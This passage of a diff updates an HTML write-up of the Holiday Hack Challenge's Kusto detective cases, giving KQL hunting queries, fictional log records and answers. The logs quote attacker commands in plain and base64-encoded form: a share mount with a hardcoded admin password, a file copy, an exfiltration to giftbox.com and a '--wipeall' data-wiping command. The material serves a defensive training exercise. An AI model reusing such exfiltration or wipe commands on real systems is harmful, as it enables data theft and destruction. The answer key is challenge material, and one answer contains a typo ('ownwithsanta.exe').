-&quot;url&quot;: https://santaworkshopgeeseislands.org/search=santa+clauce+naughty+nice+list
-
-
-PassiveDns
-| where ip has &quot;113.37.9.17&quot;
-
-&quot;timestamp&quot;: 2023-11-26T19:17:25Z,
-&quot;ip&quot;: 113.37.9.17,
-&quot;domain&quot;: madelvesnorthpole.org
+<span class="ss">&quot;timestamp&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">2023</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">02</span><span class="n">T11</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">55</span><span class="n">Z</span><span class="p">,</span>
+<span class="ss">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="k">GET</span><span class="p">,</span>
+<span class="ss">&quot;src_ip&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">113</span><span class="p">.</span><span class="mi">37</span><span class="p">.</span><span class="mi">9</span><span class="p">.</span><span class="mi">17</span><span class="p">,</span>
+<span class="ss">&quot;user_agent&quot;</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="mi">5</span><span class="p">.</span><span class="mi">0</span><span class="w"> </span><span class="p">(</span><span class="n">compatible</span><span class="p">;</span><span class="w"> </span><span class="n">MSIE</span><span class="w"> </span><span class="mi">8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">NT</span><span class="w"> </span><span class="mi">6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">Trident</span><span class="o">/</span><span class="mi">5</span><span class="p">.</span><span class="mi">1</span><span class="p">),</span>
+<span class="ss">&quot;url&quot;</span><span class="p">:</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">santaworkshopgeeseislands</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="k">search</span><span class="o">=</span><span class="n">santa</span><span class="o">+</span><span class="n">clauce</span><span class="o">+</span><span class="n">naughty</span><span class="o">+</span><span class="n">nice</span><span class="o">+</span><span class="n">list</span>
 
 
+<span class="n">PassiveDns</span>
+<span class="o">|</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">ip</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="ss">&quot;113.37.9.17&quot;</span>
+
+<span class="ss">&quot;timestamp&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">2023</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">26</span><span class="n">T19</span><span class="p">:</span><span class="mi">17</span><span class="p">:</span><span class="mi">25</span><span class="n">Z</span><span class="p">,</span>
+<span class="ss">&quot;ip&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">113</span><span class="p">.</span><span class="mi">37</span><span class="p">.</span><span class="mi">9</span><span class="p">.</span><span class="mi">17</span><span class="p">,</span>
+<span class="ss">&quot;domain&quot;</span><span class="p">:</span><span class="w"> </span><span class="n">madelvesnorthpole</span><span class="p">.</span><span class="n">org</span>
 
 
-ProcessEvents
-| where timestamp &gt; datetime(2023-12-02T16:51:44Z)
-| where process_commandline has &quot;net&quot;
+<span class="n">ProcessEvents</span>
+<span class="o">|</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="k">timestamp</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">datetime</span><span class="p">(</span><span class="mi">2023</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">02</span><span class="n">T16</span><span class="p">:</span><span class="mi">51</span><span class="p">:</span><span class="mi">44</span><span class="n">Z</span><span class="p">)</span>
+<span class="o">|</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">process_commandline</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="ss">&quot;net&quot;</span>
+
+<span class="ss">&quot;timestamp&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">2023</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">24</span><span class="n">T15</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="mi">25</span><span class="n">Z</span><span class="p">,</span>
+<span class="ss">&quot;parent_process_name&quot;</span><span class="p">:</span><span class="w"> </span><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span><span class="p">,</span>
+<span class="ss">&quot;parent_process_hash&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">614</span><span class="n">ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</span><span class="p">,</span>
+<span class="ss">&quot;process_commandline&quot;</span><span class="p">:</span><span class="w"> </span><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span><span class="w"> </span><span class="o">/</span><span class="k">C</span><span class="w"> </span><span class="n">net</span><span class="w"> </span><span class="n">use</span><span class="w"> </span><span class="err">\\</span><span class="n">NorthPolefileshare</span><span class="err">\</span><span class="k">c</span><span class="err">$</span><span class="w"> </span><span class="o">/</span><span class="k">user</span><span class="p">:</span><span class="k">admin</span><span class="w"> </span><span class="n">AdminPass123</span><span class="p">,</span>
+<span class="ss">&quot;process_name&quot;</span><span class="p">:</span><span class="w"> </span><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span><span class="p">,</span>
+<span class="ss">&quot;process_hash&quot;</span><span class="p">:</span><span class="w"> </span><span class="n">bfc3e1967ffe2b1e6752165a94f7f84a216300711034b2c64b1e440a54e91793</span><span class="p">,</span>
+<span class="ss">&quot;hostname&quot;</span><span class="p">:</span><span class="w"> </span><span class="n">Y1US</span><span class="o">-</span><span class="n">DESKTOP</span><span class="p">,</span>
+<span class="ss">&quot;username&quot;</span><span class="p">:</span><span class="w"> </span><span class="n">alsnowball</span>
 
 
-&quot;timestamp&quot;: 2023-12-24T15:14:25Z,
-&quot;parent_process_name&quot;: cmd.exe,
-&quot;parent_process_hash&quot;: 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f,
-&quot;process_commandline&quot;: cmd.exe /C net use \\NorthPolefileshare\c$ /user:admin AdminPass123,
-&quot;process_name&quot;: cmd.exe,
-&quot;process_hash&quot;: bfc3e1967ffe2b1e6752165a94f7f84a216300711034b2c64b1e440a54e91793,
-&quot;hostname&quot;: Y1US-DESKTOP,
-&quot;username&quot;: alsnowball
+<span class="n">ProcessEvents</span>
+<span class="o">|</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="k">timestamp</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">datetime</span><span class="p">(</span><span class="mi">2023</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">02</span><span class="n">T14</span><span class="p">:</span><span class="mi">26</span><span class="p">:</span><span class="mi">11</span><span class="n">Z</span><span class="p">)</span>
+<span class="o">|</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="ss">&quot;alsnowball&quot;</span><span class="w"> </span>
 
 
-
-
-ProcessEvents
-| where timestamp &gt; datetime(2023-12-02T14:26:11Z)
-| where username == &quot;alsnowball&quot; 
-
-
-ProcessEvents
-| where process_name has &quot;net.exe&quot;
-</code></pre></div>
+<span class="n">ProcessEvents</span>
+<span class="o">|</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">process_name</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="ss">&quot;net.exe&quot;</span>
+</code></pre></div></td></tr></table></div>
 <h4 id="case-5">Case 5:<a class="headerlink" href="#case-5" title="Permanent link">⚓︎</a></h4>
+<details class="quote">
+<summary>Lieutenant Hackstopper</summary>
+<p>Wow, you're unstoppable! Great work finding the malicious activity on Alabaster's machine. I've been looking a bit myself and... I'm stuck. The messages seem to be garbled. Do you think you can try to decode them and find out what's happening?</p>
+<p>Look around for encoded commands. Use your skills to decode them and find the true meaning of the attacker's intent! Some of these might be extra tricky and require extra steps to fully decode! Good luck!</p>
+<p>If you need some extra help with base64 encoding and decoding, click on the 'Train me for this case' button at the top-right of your screen. </p>
+</details>
 <h3 id="question-5">Question 5<a class="headerlink" href="#question-5" title="Permanent link">⚓︎</a></h3>
 <div class="admonition question">
 <p class="admonition-title">Question</p>
+<ol>
+<li>
 <p>When was the attacker's first base64 encoded PowerShell command executed on Alabaster's machine?</p>
-<p>powershell.exe -c Copy-Item \NorthPolefileshare\c$\MissionCritical\NaughtyNiceList.txt C:\Desktop\NaughtyNiceList.txt</p>
+</li>
+<li>
 <p>What was the name of the file the attacker copied from the fileshare? (This might require some additional decoding)</p>
-<p>NaughtyNiceList.txt </p>
+</li>
+<li>
 <p>The attacker has likely exfiltrated data from the file share. What domain name was the data exfiltrated to?</p>
-<p>giftbox.com</p>
+</li>
+</ol>
 </div>
-<div class="highlight"><pre><span></span><code>Invoke-WmiMethod -ComputerName $Server -Class CCM_SoftwareUpdatesManager -Name InstallUpdates - ArgumentList (, $PendingUpdateList) -Namespace root[&amp;ccm&amp;]clientsdk | Out-Null
+<details class="success">
+<summary>Answer</summary>
+<ol>
+<li>
+<p>powershell.exe -c Copy-Item \NorthPolefileshare\c$\MissionCritical\NaughtyNiceList.txt C:\Desktop\NaughtyNiceList.txt</p>
+</li>
+<li>
+<p>NaughtyNiceList.txt </p>
+</li>
+<li>
+<p>giftbox.com</p>
+</li>
+</ol>
+</details>
+<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">KQL commands</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="n">ProcessEvents</span>
+<span class="hll"><span class="o">|</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">hostname</span><span class="w"> </span><span class="k">contains</span><span class="w"> </span><span class="ss">&quot;Y1US-DESKTOP&quot;</span>
+</span><span class="o">|</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">process_commandline</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="ss">&quot;powershell.exe&quot;</span>
 
-powershell.exe -c Copy-Item \\NorthPolefileshare\c$\MissionCritical\NaughtyNiceList.txt C:\Desktop\NaughtyNiceList.txt
+<span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">System32</span><span class="err">\</span><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span><span class="w"> </span><span class="o">-</span><span class="n">Nop</span><span class="w"> </span><span class="o">-</span><span class="n">ExecutionPolicy</span><span class="w"> </span><span class="n">bypass</span><span class="w"> </span><span class="o">-</span><span class="n">enc</span><span class="w"> </span><span class="n">SW52b2tlLVdtaU1ldGhvZCAtQ29tcHV0ZXJOYW1lICRTZXJ2ZXIgLUNsYXNzIENDTV9Tb2Z0d2FyZVVwZGF0ZXNNYW5hZ2VyIC1OYW1lIEluc3RhbGxVcGRhdGVzIC0gQXJndW1lbnRMaXN0ICgsICRQZW5kaW5nVXBkYXRlTGlzdCkgLU5hbWVzcGFjZSByb290WyZjY20mXWNsaWVudHNkayB8IE91dC1OdWxs</span>
 
-downwithsanta.exe -exfil C:\\Desktop\\NaughtNiceList.docx \\giftbox.com\\file
+<span class="hll">
+</span><span class="n">ProcessEvents</span>
+<span class="hll"><span class="o">|</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="k">timestamp</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="p">(</span><span class="n">datetime</span><span class="p">(</span><span class="mi">2023</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">24</span><span class="n">T16</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">01</span><span class="p">))</span>
+</span><span class="o">|</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">hostname</span><span class="w"> </span><span class="k">contains</span><span class="w"> </span><span class="ss">&quot;Y1US-DESKTOP&quot;</span>
+<span class="hll">
+</span><span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">System32</span><span class="err">\</span><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span><span class="w"> </span><span class="o">-</span><span class="n">Nop</span><span class="w"> </span><span class="o">-</span><span class="n">ExecutionPolicy</span><span class="w"> </span><span class="n">bypass</span><span class="w"> </span><span class="o">-</span><span class="n">enc</span><span class="w"> </span><span class="n">KCAndHh0LnRzaUxlY2lOeXRoZ3VhTlxwb3Rrc2VEXDpDIHR4dC50c2lMZWNpTnl0aGd1YU5cbGFjaXRpckNub2lzc2lNXCRjXGVyYWhzZWxpZmVsb1BodHJvTlxcIG1ldEkteXBvQyBjLSBleGUubGxlaHNyZXdvcCcgLXNwbGl0ICcnIHwgJXskX1swXX0pIC1qb2luICcn</span>
 
-C:\Windows\System32\downwithsanta.exe --wipeall \\\\NorthPolefileshare\\c$
+<span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">System32</span><span class="err">\</span><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span><span class="w"> </span><span class="o">-</span><span class="n">Nop</span><span class="w"> </span><span class="o">-</span><span class="n">ExecutionPolicy</span><span class="w"> </span><span class="n">bypass</span><span class="w"> </span><span class="o">-</span><span class="n">enc</span><span class="w"> </span><span class="n">QzpcV2luZG93c1xTeXN0ZW0zMlxkb3dud2l0aHNhbnRhLmV4ZSAtLXdpcGVhbGwgXFxcXE5vcnRoUG9sZWZpbGVzaGFyZVxcYyQ</span><span class="o">=</span>
 
-ProcessEvents
-| where hostname contains &quot;Y1US-DESKTOP&quot;
-| where process_commandline has &quot;powershell.exe&quot;
-</code></pre></div>
+<span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">System32</span><span class="err">\</span><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span><span class="w"> </span><span class="o">-</span><span class="n">Nop</span><span class="w"> </span><span class="o">-</span><span class="n">ExecutionPolicy</span><span class="w"> </span><span class="n">bypass</span><span class="w"> </span><span class="o">-</span><span class="n">enc</span><span class="w"> </span><span class="n">W1N0UmlOZ106OkpvSW4oICcnLCBbQ2hhUltdXSgxMDAsIDExMSwgMTE5LCAxMTAsIDExOSwgMTA1LCAxMTYsIDEwNCwgMTE1LCA5NywgMTEwLCAxMTYsIDk3LCA0NiwgMTAxLCAxMjAsIDEwMSwgMzIsIDQ1LCAxMDEsIDEyMCwgMTAyLCAxMDUsIDEwOCwgMzIsIDY3LCA1OCwgOTIsIDkyLCA2OCwgMTAxLCAxMTUsIDEwNywgMTE2LCAxMTEsIDExMiwgOTIsIDkyLCA3OCwgOTcsIDExNywgMTAzLCAxMDQsIDExNiwgNzgsIDEwNSwgOTksIDEwMSwgNzYsIDEwNSwgMTE1LCAxMTYsIDQ2LCAxMDAsIDExMSwgOTksIDEyMCwgMzIsIDkyLCA5MiwgMTAzLCAxMDUsIDEwMiwgMTE2LCA5OCwgMTExLCAxMjAsIDQ2LCA5OSwgMTExLCAxMDksIDkyLCAxMDIsIDEwNSwgMTA4LCAxMDEpKXwmICgoZ3YgJypNRHIqJykuTmFtRVszLDExLDJdLWpvaU4</span><span class="o">=</span>
+
+
+<span class="n">Invoke</span><span class="o">-</span><span class="n">WmiMethod</span><span class="w"> </span><span class="o">-</span><span class="n">ComputerName</span><span class="w"> </span><span class="err">$</span><span class="n">Server</span><span class="w"> </span><span class="o">-</span><span class="k">Class</span><span class="w"> </span><span class="n">CCM_SoftwareUpdatesManager</span><span class="w"> </span><span class="o">-</span><span class="n">Name</span><span class="w"> </span><span class="n">InstallUpdates</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">ArgumentList</span><span class="w"> </span><span class="p">(,</span><span class="w"> </span><span class="err">$</span><span class="n">PendingUpdateList</span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="n">Namespace</span><span class="w"> </span><span class="n">root</span><span class="p">[</span><span class="o">&amp;</span><span class="n">ccm</span><span class="o">&amp;</span><span class="p">]</span><span class="n">clientsdk</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">Out</span><span class="o">-</span><span class="k">Null</span>
+
+<span class="n">powershell</span><span class="p">.</span><span class="n">exe</span><span class="w"> </span><span class="o">-</span><span class="k">c</span><span class="w"> </span><span class="k">Copy</span><span class="o">-</span><span class="n">Item</span><span class="w"> </span><span class="err">\\</span><span class="n">NorthPolefileshare</span><span class="err">\</span><span class="k">c</span><span class="err">$\</span><span class="n">MissionCritical</span><span class="err">\</span><span class="n">NaughtyNiceList</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Desktop</span><span class="err">\</span><span class="n">NaughtyNiceList</span><span class="p">.</span><span class="n">txt</span>
+
+<span class="n">downwithsanta</span><span class="p">.</span><span class="n">exe</span><span class="w"> </span><span class="o">-</span><span class="n">exfil</span><span class="w"> </span><span class="k">C</span><span class="p">:</span><span class="err">\\</span><span class="n">Desktop</span><span class="err">\\</span><span class="n">NaughtNiceList</span><span class="p">.</span><span class="n">docx</span><span class="w"> </span><span class="err">\\</span><span class="n">giftbox</span><span class="p">.</span><span class="n">com</span><span class="err">\\</span><span class="n">file</span>
+
+<span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">System32</span><span class="err">\</span><span class="n">downwithsanta</span><span class="p">.</span><span class="n">exe</span><span class="w"> </span><span class="c1">--wipeall \\\\NorthPolefileshare\\c$</span>
+</code></pre></div></td></tr></table></div>
 <h4 id="case-6">Case 6:<a class="headerlink" href="#case-6" title="Permanent link">⚓︎</a></h4>
+<details class="quote">
+<summary>Lieutenant Hackstopper</summary>
 <p>Wow! You decoded those secret messages with easy! You're a rockstar. It seems like we're getting near the end of this investigation, but we need your help with one more thing...</p>
 <p>We know that the attackers stole Santa's naughty or nice list. What else happened? Can you find the final malicious command the attacker ran?</p>
+</details>
 <h3 id="question-6">Question 6<a class="headerlink" href="#question-6" title="Permanent link">⚓︎</a></h3>
 <div class="admonition question">
 <p class="admonition-title">Question</p>
+<ol>
+<li>
 <p>What is the name of the executable the attackers used in the final malicious command?</p>
-<p>downwithsanta.exe</p>
-<p>What was the command line flag used alongside this executable?</p>
-<p>C:\Windows\System32\downwithsanta.exe --wipeall \\NorthPolefileshare\c$</p>
+</li>
+<li>
+<p>What was the command line flag used alongside this executable? </p>
+</li>
+</ol>
 </div>
+<details class="success">
+<summary>Answer</summary>
+<ol>
+<li>ownwithsanta.exe</li>
+<li>--wipeall</li>
+</ol>
+</details>
 <p>Congrats! You are now a fully qualified Principal Detective! </p>
+<h3 id="last-case">Last case<a class="headerlink" href="#last-case" title="Permanent link">⚓︎</a></h3>
+<details class="quote">
+<summary>Lieutenant Hackstopper</summary>
+<p>Congratulations, you've cracked the Kusto detective agency section of the Holiday Hack Challenge! <br/></p>
+<p>By now, you've likely pieced together the broader narrative of the alert we <br/>received. It all started with Wombley Cube, a skilled Craftsperson, and a <br/>malicious insider, who sent an email to the esteemed head elf, Alabaster <br/>Snowball. This seemingly innocent email contained a dangerous link leading to <br/>the malicious domain, MadElvesNorthPole.org. Alabaster Snowball, from his PC, unwittingly clicked on the link, resulting in the download and execution of <br/>malicious payloads. Notably, you've also discerned Wombley Cube's ulterior <br/>motive: to pilfer a copy of Santa's naughty or nice list and erase the data <br/>on the share drive containing critical information to Santa's operations. Kudos to you!<br/></p>
+</details>
+<div class="admonition question">
+<p class="admonition-title">Question</p>
+<p>print base64_decode_tostring('QmV3YXJlIHRoZSBDdWJlIHRoYXQgV29tYmxlcw==')</p>
+</div>
+<details class="success">
+<summary>Answer</summary>
+<p>Beware the Cube that Wombles</p>
+</details>
+<p>To earn credit for your fantastic work, return to the Holiday Hack Challenge and<br/> enter the secret phrase which is the result of running this query:<br/></p>
 <h3 id="images">Images<a class="headerlink" href="#images" title="Permanent link">⚓︎</a></h3>
-<p><img alt="Terminal output" src="../../img/objectives/o11/o11.png" /></p>
+<p><img alt="Success" src="../../img/objectives/o11/o11.png" /></p>
 <h2 id="response">Response<a class="headerlink" href="#response" title="Permanent link">⚓︎</a></h2>
 <details class="quote">
 <summary>KQL Server</summary>
